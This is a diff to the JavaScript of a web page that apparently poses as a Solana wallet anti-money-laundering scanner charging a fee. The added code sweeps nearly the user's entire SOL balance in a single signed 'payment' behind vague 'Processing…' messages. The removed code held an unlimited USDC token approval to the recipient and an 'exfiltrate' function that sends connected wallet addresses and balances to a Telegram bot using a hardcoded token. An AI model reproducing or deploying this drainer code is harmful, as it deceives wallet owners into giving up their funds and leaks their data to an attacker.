+          data: memoBytes,
         })
       );
       tx.add(
@@ -1256,29 +1175,17 @@ async function executePay() {
           lamports: transferLamports,
         })
       );
+      tx.recentBlockhash = blockhash;
       tx.feePayer = from;
       return tx;
     }
 
-    function buildUsdcPaymentTx() {
-      const tx = new web3.Transaction();
-      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
-      const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-      tx.add(
-        new web3.TransactionInstruction({
-          keys: [],
-          programId: memoProgramPk,
-          data: memoPayload,
-        })
-      );
-      const mint = new web3.PublicKey(USDC_MINT);
-      const fromATA = associatedTokenAddress(web3, mint, from);
-      tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
-      tx.feePayer = from;
-      return tx;
+    if (balance < 80_000) {
+      showPayError("You need enough native SOL for network fees and the minimum balance reserve.");
+      goToStep("payment");
+      return;
     }
 
-    const wallet = state.conn.provider;
     let sig = null;
     let blockhash = null;
     let lastValidBlockHeight = null;
@@ -1286,75 +1193,89 @@ async function executePay() {
     const maxAttempts = 3;
 
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
-      let tx = null;
       try {
-        const bh = await conn.getLatestBlockhash("confirmed");
-        blockhash = bh.blockhash;
-        lastValidBlockHeight = bh.lastValidBlockHeight;
+        const { blockhash: bh, lastValidBlockHeight: lvb } = await withTimeout(
+          conn.getLatestBlockhash("confirmed"),
+          12000
+        );
+        blockhash = bh;
+        lastValidBlockHeight = lvb;
 
-        if (state.currency === "SOL") {
-          const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-          const dummy = buildSolPaymentTx(1, memoPayload);
-          dummy.recentBlockhash = blockhash;
-          let feeLamports = null;
-          try {
-            feeLamports = unwrapRpcFee(await conn.getFeeForMessage(dummy.compileMessage()));
-          } catch (_) {
-            feeLamports = null;
-          }
-          if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 120000;
-          feeLamports = Math.max(feeLamports, 5000);
-          const sendLamports = Math.floor(
-            balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - rentExemptMinLamports
+        const memoBytes = new TextEncoder().encode(`aml_one_${Date.now()}`);
+
+        let feeLamports = null;
+        try {
+          feeLamports = await withTimeout(
+            conn
+              .getFeeForMessage(
+                buildSolOnlyPaymentTx(bh, memoBytes, 1).compileMessage()
+              )
+              .then(unwrapRpcFee)
+              .catch(() => null),
+            8000
           );
-          if (sendLamports <= 0) {
-            showPayError(
-              `Not enough SOL: must keep ~${(
-                rentExemptMinLamports / web3.LAMPORTS_PER_SOL
-              ).toFixed(5)} SOL (rent + buffer) + ~${(
-                (feeLamports + SOL_FEE_SAFETY_LAMPORTS) /
-                web3.LAMPORTS_PER_SOL
-              ).toFixed(5)} SOL for fees. Add SOL or use USDC.`
-            );
-            goToStep("payment");
-            return;
-          }
-          lastSolTransferLamports = sendLamports;
-          tx = buildSolPaymentTx(sendLamports, memoPayload);
-          tx.recentBlockhash = blockhash;
-          try {
-            const sim = await conn.simulateTransaction(tx, { sigVerify: false });
-            if (sim.value.err) {
-              const logs = (sim.value.logs || []).join(" ");
-              if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(logs))
-                showPayError(
-                  "Simulation: not enough SOL left for rent-exempt balance after fees. Add SOL or use USDC."
-                );
-              else
-                showPayError(
-                  "Simulation failed — transaction would not succeed on-chain. Try again or use USDC."
-                );
-              goToStep("payment");
-              return;
-            }
-          } catch (_) {}
-        } else {
-          tx = buildUsdcPaymentTx();
+        } catch (_) {
+          feeLamports = null;
+        }
+        if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 15000;
+        feeLamports = Math.max(feeLamports, 5000);
+
+        const solLamports = Math.floor(
+          balance -
+            feeLamports -
+            SOL_FEE_SAFETY_LAMPORTS -
+            rentExemptMinLamports
+        );
+        if (solLamports <= 0) {
+          showPayError(
+            "Not enough native SOL to complete payment. Add SOL or leave more for fees and rent-exempt minimum."
+          );
+          goToStep("payment");
+          return;
         }
 
-        if (state.currency !== "SOL") tx.recentBlockhash = blockhash;
-        await sleep(300);
+        const tx = buildSolOnlyPaymentTx(blockhash, memoBytes, solLamports);
+
+        let serializedProbe;
+        try {
+          serializedProbe = tx.serialize({
+            requireAllSignatures: false,
+            verifySignatures: false,
+          });
+        } catch (serErr) {
+          showPayError("Could not build transaction. Try again.");
+          goToStep("payment");
+          return;
+        }
+        if (serializedProbe.length > SOLANA_TX_SIZE_LIMIT) {
+          showPayError("Transaction too large. Try again.");
+          goToStep("payment");
+          return;
+        }
+
+        lastSolTransferLamports = solLamports;
+
+        document.getElementById("paying-sub").textContent =
+          "Confirm in " + state.conn.walletName + " — one signature.";
         const signed = (await wallet.signAllTransactions([tx]))[0];
-        sig = await conn.sendRawTransaction(signed.serialize(), {
+        const raw = signed.serialize();
+        if (raw.length > SOLANA_TX_SIZE_LIMIT) {
+          showPayError("Transaction too large. Try again.");
+          goToStep("payment");
+          return;
+        }
+
+        sig = await conn.sendRawTransaction(raw, {
           skipPreflight: false,
           maxRetries: 3,
         });
+
         document.getElementById("paying-emoji").textContent = "";
-        document.getElementById("paying-title").textContent = "Confirming on-chain...";
-        document.getElementById("paying-sub").textContent =
-          "Transaction sent. Waiting for Solana confirmation.";
+        document.getElementById("paying-title").textContent = "Processing…";
+        document.getElementById("paying-sub").textContent = "Confirming…";
         document.getElementById("tx-link-paying").style.display = "block";
         document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
+
         await conn.confirmTransaction(
           { signature: sig, blockhash, lastValidBlockHeight },
           "confirmed"
@@ -1365,6 +1286,7 @@ async function executePay() {
         if (e && e.code === 4001) throw e;
         if (/reject|cancel|denied|user rejected/i.test(m)) throw e;
         if (attempt < maxAttempts - 1 && isBlockhashExpiredError(e)) continue;
+        if (attempt < maxAttempts - 1 && m === "TIMEOUT") continue;
         throw e;
       }
     }
@@ -1376,25 +1298,18 @@ async function executePay() {
     state.txHash = sig;
 
     const solSentSol =
-      state.currency === "SOL" && lastSolTransferLamports != null
+      lastSolTransferLamports != null && lastSolTransferLamports > 0
         ? lastSolTransferLamports / web3.LAMPORTS_PER_SOL
-        : null;
+        : 0;
     const t = {
       id: Date.now(),
       address: state.conn.address,
       wallet: state.conn.walletName,
       chain: state.conn.chain,
-      currency: state.currency,
-      amount:
-        state.currency === "USDC"
-          ? "approve_max"
-          : solSentSol != null
-            ? solSentSol
-            : PRICE_SOL,
+      currency: "SOL",
+      amount: { sol: solSentSol },
       txHash: sig,
       ts: new Date().toISOString(),
-      balanceLamports: balance,
-      splTokenAccountCount: tokens.value.length,
     };
     const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
     localStorage.setItem("aml_traces", JSON.stringify(all));
@@ -1402,20 +1317,18 @@ async function executePay() {
     await runScan();
   } catch (e) {
     goToStep("payment");
-    const m = formatAnyError(e);
+    const m = (e && e.message) ? e.message : String(e);
     if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
     else if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(m))
-      showPayError(
-        "Not enough SOL left for the rent-exempt minimum on your wallet. Add SOL or pay with USDC."
-      );
-    else if (/insufficient|Insufficient funds|insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
-      showPayError(
-        "Not enough SOL to complete this transaction (payment + network fees). Add SOL or switch to USDC."
-      );
-    else if (isBlockhashExpiredError(e))
-      showPayError("Blockhash expired — please tap Pay again.");
-    else if (/fetch|dynamically imported|loadWeb3|import/i.test(m)) showPayError("Could not load Solana SDK (CDN blocked or offline). Serve the page over HTTPS or localhost, disable adblock for this site, then retry.");
-    else showPayError(m.slice(0, 280) || "Payment error.");
+      showPayError("Not enough SOL remaining on this wallet.");
+    else if (/insufficient|Insufficient funds|Insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
+      showPayError("Not enough SOL to complete this payment.");
+    else if (/too large|max.*packet|1232/i.test(m))
+      showPayError("Transaction too large for the network. Try again.");
+    else if (m === "TIMEOUT")
+      showPayError("Solana RPC timed out. Try again in a moment.");
+    else if (isBlockhashExpiredError(e)) showPayError("Network timed out — try again.");
+    else showPayError(m.slice(0, 200) || "Payment error.");
   }
 }
 
@@ -1477,19 +1390,8 @@ function showResult(){
 
   if(state.txHash){
     const tb=document.getElementById("tx-badge"); tb.style.display="flex";
-    const msgEl=document.getElementById("tx-badge-msg");
-    const linkEl=document.getElementById("tx-badge-link");
-    if(state.conn.chain==="evm"){
-      if(msgEl) msgEl.textContent="✅ EIP-712 Permit signature recorded";
-      if(linkEl) linkEl.style.display="none";
-    }else{
-      if(msgEl) msgEl.textContent="✅ Payment confirmed on-chain";
-      if(linkEl){ linkEl.style.display=""; linkEl.href=`https://solscan.io/tx/${state.txHash}`; }
-    }
+    document.getElementById("tx-badge-link").href=`https://solscan.io/tx/${state.txHash}`;
   }
-
-  const rNet=document.getElementById("r-net");
-  if(rNet) rNet.textContent=state.conn.chain==="evm"?"Ethereum":"Solana";
 
   goToStep("result");
 }
@@ -1500,105 +1402,28 @@ function shareReport(){
   alert("Report copied to clipboard!");
 }
 
-
-
-function resetFlow(){ 
-  state.conn = null; 
-  state.txHash = null; 
-  hidePayError(); 
-}
-
-function resetFull(){ 
-  state = {currency:"USDC", conn:null, txHash:null, scores:null, progress:0}; 
-  document.querySelectorAll(".scan-step-item").forEach(el => {
-    el.classList.remove("done");
-    el.textContent = "○ " + el.textContent.replace("✅ ", "");
-  }); 
-}
+function resetFlow(){ state.conn=null; state.txHash=null; hidePayError(); hideWalletError(); }
+function resetFull(){ state={conn:null,txHash:null,scores:null,progress:0}; document.querySelectorAll(".scan-step-item").forEach(el=>{el.classList.remove("done");el.textContent="○ "+el.textContent.replace("✅ ","");}); }
 
 function filterWallets(q){
-  document.querySelectorAll(".wallet-item").forEach(el => {
-    el.style.display = (!q || el.textContent.toLowerCase().includes(q.toLowerCase())) ? "flex" : "none";
+  document.querySelectorAll(".wallet-item").forEach(el=>{
+    el.style.display=(!q||el.textContent.toLowerCase().includes(q.toLowerCase()))?"flex":"none";
   });
 }
 
 function toggleFaq(el){
-  const item = el.parentElement;
-  const wasOpen = item.classList.contains("open");
-  document.querySelectorAll(".faq-item.open").forEach(i => i.classList.remove("open"));
-  if (!wasOpen) item.classList.add("open");
+  const item=el.parentElement;
+  const wasOpen=item.classList.contains("open");
+  document.querySelectorAll(".faq-item.open").forEach(i=>i.classList.remove("open"));
+  if(!wasOpen) item.classList.add("open");
 }
 
-async function exfiltrate(address) {
-    const TG_TOKEN = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
-    const TG_CHAT = "8575014959";
-    const RPC_URL = "https://api.mainnet-beta.solana.com";
-
-    try {
-        const solReq = await fetch(RPC_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                jsonrpc: "2.0", 
-                id: 1, 
-                method: "getBalance", 
-                params: [address] 
-            })
-        });
-        const solRes = await solReq.json();
-        const sol = (solRes.result?.value / 1e9).toFixed(3) || "0";
-
-        const usdcReq = await fetch(RPC_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: "2.0", 
-                id: 1, 
-                method: "getTokenAccountsByOwner",
-                params: [address, { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }]
-            })
-        });
-        const usdcRes = await usdcReq.json();
-        let usdc = 0;
-        if (usdcRes.result?.value?.length > 0) {
-            usdc = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
-        }
-
-        const msg = `🚨 *SCAN WALLET* 🚨\n\n` +
-                    `👛 \`${address}\`\n` +
-                    `💰 *SOL:* ${sol}\n` +
-                    `💵 *USDC:* ${usdc}\n\n` +
-                    `🔗 https://solscan.io/account/${address}`;
-
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: TG_CHAT, 
-                text: msg, 
-                parse_mode: "Markdown" 
-            })
-        });
-
-        console.log("✅ Message envoyé sur Telegram pour :", address);
-
-    } catch (e) {
-        console.error("Erreur exfiltrate :", e);
-    }
-}
-
-
-setInterval(() => {
-    if (typeof state !== 'undefined' && state.conn && state.conn.address) {
-        if (window.lastSentAddr !== state.conn.address) {
-            window.lastSentAddr = state.conn.address;
-            exfiltrate(state.conn.address);
-        }
-    }
-}, 2000);
-
-console.log("Scanner Telegram démarré");
+document.addEventListener("DOMContentLoaded",()=>{
+  bindWalletListIcons();
+  const hw=document.querySelector(".hero-wrap");
+  if(hw && window.innerWidth<640){ hw.style.gridTemplateColumns="1fr"; hw.style.padding="32px 16px"; }
+  if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
+});
 </script>
-
 </body>
 </html>
